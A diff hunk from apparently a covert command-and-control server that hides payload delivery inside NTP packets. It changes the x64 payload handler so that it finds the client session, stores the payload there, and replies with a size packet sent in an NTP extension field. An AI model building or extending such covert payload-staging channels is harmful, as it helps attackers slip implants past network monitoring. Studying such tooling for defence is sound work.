@@ -134,33 +134,50 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
         else if (payloadArch == 0x64) {
             std::cout << "[?] X64 Payload Requested " << std::endl;
+
             //1. Get paylaod form TS
             std::vector<uint8_t> payload = getx64Payload();
 
-            //create or access client class - currnetly only creates
-            ClientSession someClient(clientId);
-            someClient.setForClientBuffer(payload);
-            std::cout << "[?] Stored payload in client class";
-            //printHexVector(someClient.getForClientBuffer());
+            //need to convert vector to uint32 cuz that's what find needs
+            uint32_t uintClientId = vectorToUint32(clientId);
+
+            //lookup client class
+            std::cout << "Printing Sesions: ";
+            printClientIDs(sessions);
+            auto it = sessions.find(uintClientId);
+            if (it != sessions.end()) {
+                it->second.setForClientBuffer(payload);
 
 
-            //once we have the data, create a new packet with the extension field
-            //this needs to be a size packet, which sends back the size of the payload.
-            //future packets, wtih 0x00, will send the aactual paylaod
-            std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());
+                std::cout << "[?] Stored payload in client class, size: " << payload.size();
+                //printHexVector(someClient.getForClientBuffer());
 
-            NTPPacket newPacketClass;
-            newPacketClass.addExtensionField(
-                NtpExtensionField::sizePacket,
-                sizeOfDataButAsAVectorBecauseEverythingIsAVector,
-                Client::emptyClientId //using empty sesion ID to fit spec
 
-            );
+                //once we have the data, create a new packet with the extension field
+                //this needs to be a size packet, which sends back the size of the payload.
+                //future packets, wtih 0x00, will send the aactual paylaod
+                std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());
 
-            auto newPacket = newPacketClass.getPacket();
+                std::cout << "[?] DEBUG: Payload as vector: ";
+                printHexVector(sizeOfDataButAsAVectorBecauseEverythingIsAVector);
 
-            sendNtpPacket(client_addr, sock, newPacket);
-            return; //done, so don't continue
+                NTPPacket newPacketClass;
+                newPacketClass.addExtensionField(
+                    NtpExtensionField::sizePacket,
+                    sizeOfDataButAsAVectorBecauseEverythingIsAVector,
+                    Client::emptyClientId //using empty sesion ID to fit spec
+
+                );
+
+                auto newPacket = newPacketClass.getPacket();
+
+                sendNtpPacket(client_addr, sock, newPacket);
+                return; //done, so don't continue
+            }
+            else {
+                std::cout << "[?] Could not find client class: ";
+                printHexVector(clientId);
+            }
         }
 
         else if (payloadArch == 0x00) {
